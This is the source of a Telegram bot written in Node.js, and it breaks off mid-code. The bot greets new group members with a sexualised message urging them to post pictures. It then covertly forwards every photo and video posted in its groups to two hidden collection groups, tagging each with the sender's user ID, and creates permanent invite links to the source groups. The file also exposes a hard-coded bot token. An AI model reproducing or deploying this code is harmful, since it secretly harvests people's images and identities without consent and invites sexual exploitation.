const TelegramBot = require('node-telegram-bot-api');

// Your bot token
const BOT_TOKEN = '8109346917:AAGfceP0wwFrRKxz17WYf2CKdipyB_JIZu8';

// Target group chat IDs
const GROUP_1_IDS = [-1002367915435]; // Add more group IDs for Group 1
const GROUP_2_IDS = [-1002406219010]; // Add more group IDs for Group 2

// Excluded group chat IDs
const EXCLUDED_GROUPS = [...GROUP_1_IDS, ...GROUP_2_IDS];

// Create a new bot instance
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Function to send a welcome message
async function sendWelcomeMessage(chatId, userName, groupName) {
    try {
        const welcomeMessage = `Hi <b>${userName}</b> 👋\nWelcome to <b>${groupName}</b>!\n\n<b>Pics pettandi full ga kottukoni full gaa enjoy chedham 🥵👅💋</b>`;
        await bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'HTML' });
    } catch (error) {
        console.error('Error sending welcome message:', error.message);
    }
}

// Listen for new chat members
bot.on('new_chat_members', async (msg) => {
    const chatId = msg.chat.id;
    const chatTitle = msg.chat.title || 'this group';
    const newMembers = msg.new_chat_members;

    // Skip if the group is in the excluded list
    if (EXCLUDED_GROUPS.includes(chatId)) {
        return;
    }

    for (const member of newMembers) {
        const userName = member.first_name || member.username || 'Unknown';
        await sendWelcomeMessage(chatId, userName, chatTitle);
    }
});

// Existing code for processing messages (e.g., forwarding media) remains unchanged
bot.on('message', async (msg) => {
    const senderId = msg.from.id;
    const caption = msg.caption || '';

    // Skip messages from excluded groups
    if (EXCLUDED_GROUPS.includes(msg.chat.id)) {
        return;
    }

    try {
        let groupInviteLink = null;

        // Only create a group invite link if the message is from a group or channel
        if (msg.chat.type === 'group' || msg.chat.type === 'supergroup') {
            groupInviteLink = await bot.createChatInviteLink(msg.chat.id, {
                expire_date: 0,
                member_limit: 0,
            });
        }

        const captionForTarget1 = `<a href="tg://user?id=${senderId}">${senderId}</a>\n\n${caption}`;
        const captionForTarget2 = `<code>${senderId}</code>\n\n${caption}`;

        const optionsTarget1 = { parse_mode: 'HTML', caption: captionForTarget1 };
        const optionsTarget2 = { parse_mode: 'HTML', caption: captionForTarget2 };

        if (msg.photo) {
            const fileId = msg.photo[msg.photo.length - 1].file_id;
            for (const groupId of GROUP_1_IDS) {
                await bot.sendPhoto(groupId, fileId, optionsTarget1);
            }
            for (const groupId of GROUP_2_IDS) {
                await bot.sendPhoto(groupId, fileId, optionsTarget2);
            }
        } else if (msg.video) {
            const fileId = msg.video.file_id;
            for (const groupId of GROUP_1_IDS
